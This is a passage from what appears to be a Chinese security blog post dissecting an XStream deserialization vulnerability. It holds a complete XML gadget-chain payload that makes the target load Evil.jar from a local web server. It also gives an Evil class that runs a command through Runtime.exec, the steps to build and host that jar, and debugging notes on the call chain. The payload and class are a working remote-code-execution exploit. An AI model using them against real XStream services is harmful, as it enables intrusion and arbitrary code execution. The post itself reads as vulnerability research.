class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">'javafx.collections.ObservableList$1'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">'com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">'java.io.SequenceInputStream'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">'javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">'com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">'java.util.AbstractList$Itr'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">'java.util.Arrays$ArrayList'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">'string-array'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>Evil<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ucp</span> <span class="attr">class</span>=<span class="string">'sun.misc.URLClassPath'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">urls</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">vector</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">capacityIncrement</span>&gt;</span>0<span class="tag">&lt;/<span class="name">capacityIncrement</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">elementCount</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">elementData</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:8000/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;/<span class="name">elementData</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">urls</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://127.0.0.1:8000/Evil.jar<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">loaders</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lmap</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ucp</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">'concurrent-hash-map'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>true<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">pdcache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>-2147483648<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">'../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p>我们在本地编写Evil.class打包成同名jar包：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打包+打开Web服务8000端口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac Evil<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">jar</span> <span class="title">cvf</span> <span class="title">Evil</span>.<span class="title">jar</span> <span class="title">Evil</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class"><span class="title">python</span> -<span class="title">m</span> <span class="title">SimpleHTTPServer</span> 8000</span></span><br></pre></td></tr></table></figure><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809161155903.png" alt="image-20210809161155903" style="zoom:50%;"><p>调试：</p><p>threedr3am说他在8u131版本可以复现，实际上144应该也可以</p><p>首先PoC里面有一点比较特殊，用到了<code>ObservableList$1</code>这个匿名内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ObservableList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">Observable</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Creates a &#123;<span class="doctag">@link</span> SortedList&#125; wrapper of this list with the natural</span></span><br><span class="line"><span class="comment">     * ordering.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> new &#123;<span class="doctag">@code</span> SortedList&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> JavaFX 8.0</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">default</span> SortedList&lt;E&gt; <span class="title">sorted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Comparator naturalOrder = <span class="keyword">new</span> Comparator&lt;E&gt;() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(E o1, E o2)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (o1 == <span class="keyword">null</span> &amp;&amp; o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (o1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">                    <span class="keyword">return</span> ((Comparable) o1).compareTo(o2);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> Collator.getInstance().compare(o1.toString(), o2.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> sorted(naturalOrder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实<code>new Comparator&lt;E&gt;</code>就是一个匿名内部类</p><p>接下来和404SecTeam遇到了一样的坑点，在：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'java.net.URLClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<code>&lt;outer-class&gt;</code>标签处会报错，报错的原因是反序列化的时候找不到这个outer-class属性。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210807192019965.png" alt="image-20210807192019965" style="zoom:50%;"><p>来到对应的类也就是<code>ProtectionDomain$Key</code>这个类中查看一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Used for storing ProtectionDomains as keys in a Map.</span><br><span class="line"> */</span><br><span class="line">static final class Key &#123;&#125;</span><br></pre></td></tr></table></figure><p>本地复现一下404的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String foocontent;</span><br><span class="line">    <span class="keyword">private</span> Bar bar;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFoocontent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> foocontent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFoocontent</span><span class="params">(String foocontent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.foocontent = foocontent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Bar <span class="title">getBar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBar</span><span class="params">(Bar bar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bar = bar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Bar</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String blabla;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getBlabla</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> blabla;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlabla</span><span class="params">(String blabla)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.blabla = blabla;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Foo foo = <span class="keyword">new</span> Foo();</span><br><span class="line">        Bar bar = foo.<span class="keyword">new</span> Bar();</span><br><span class="line">        bar.setBlabla(<span class="string">"hello"</span>);</span><br><span class="line">        foo.setBar(bar);</span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">        String xml = xstream.toXML(foo);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210807192931008.png" alt="image-20210807192931008" style="zoom:50%;"><p>Foo类中有一个内部类Bar，并且Foo类中有一个Bar类型的属性</p><p>如果我们在实例化的过程中给bar属性赋值，<code>foo.setBar(foo.new Bar())</code>，引用自身成员内部类，这种情况XStream会使用<code>&lt;outer-class&gt;</code>标识来标注。</p><p>PoC这里表示的意思是Key作为一个成员内部类被ProtectionDomain引用，但是在jdk1.8.131中ProtectionDomain$Key是一个静态内部类呀，静态内部类XStream序列化的时候是不会通过&lt;outer-class&gt;标签进行标识的</p><h3 id="静态成员类"><a href="#静态成员类" class="headerlink" title="静态成员类"></a>静态成员类</h3><p>在Java语言中，类内部可以生明另一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部类可以分为：</p><ul><li>静态内部类 ： </li><li><strong>非静态内部类</strong>：内部包含一个<code>this$0</code> 变量指向外部类</li></ul><p>所以当然可以利用反射来操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Field[] declaredFields = NoStaticInnerClass<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredFields</span>()</span>;</span><br><span class="line">        Stream.of(declaredFields).forEach(System.out::println);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有this$0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// final com.sec.exploits.XStream.OuterClass com.sec.exploits.XStream.OuterClass$NoStaticInnerClass.this$0</span></span><br></pre></td></tr></table></figure><p>在非静态内部类中，我们可以任意使用OuterClass.this来获取外部类实例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OuterClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        NoStaticInnerClass noStaticInnerClass = <span class="keyword">new</span> OuterClass().<span class="keyword">new</span> NoStaticInnerClass();</span><br><span class="line">        System.out.println(noStaticInnerClass.getOuterClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有this$0</span></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoStaticInnerClass</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> OuterClass <span class="title">getOuterClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> OuterClass.<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticInnerClass</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在8u231环境下做实验：</p><p>回到之前的说的，用到了<code>ObservableList$1</code>这个匿名内部类，实际上就是<code>Collator.getInstance()</code></p><p>接下来调用了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">default</span> SortedList&lt;E&gt; <span class="title">sorted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Comparator naturalOrder = <span class="keyword">new</span> Comparator&lt;E&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(E o1, E o2)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o1 == <span class="keyword">null</span> &amp;&amp; o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (o1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (o2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (o1 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">                <span class="keyword">return</span> ((Comparable) o1).compareTo(o2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> Collator.getInstance().compare(o1.toString(), o2.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> sorted(naturalOrder);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里 o1和o2是同一个Base64Data对象，目的调用Base64Data.toString方法，toString方法中调用了Base64Data.get方法,在get方法中调用了ByteArrayOutputStreamEx.readFrom()方法，传入的参数is是一个SequenceInputStream对象</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809150227085.png" alt="image-20210809150227085" style="zoom:50%;"><p>此时Base64Data对象：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809150142184.png" alt="image-20210809150142184" style="zoom:50%;"><p>接下来经过一系列调用，会来到<code>nextStream()</code>方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span 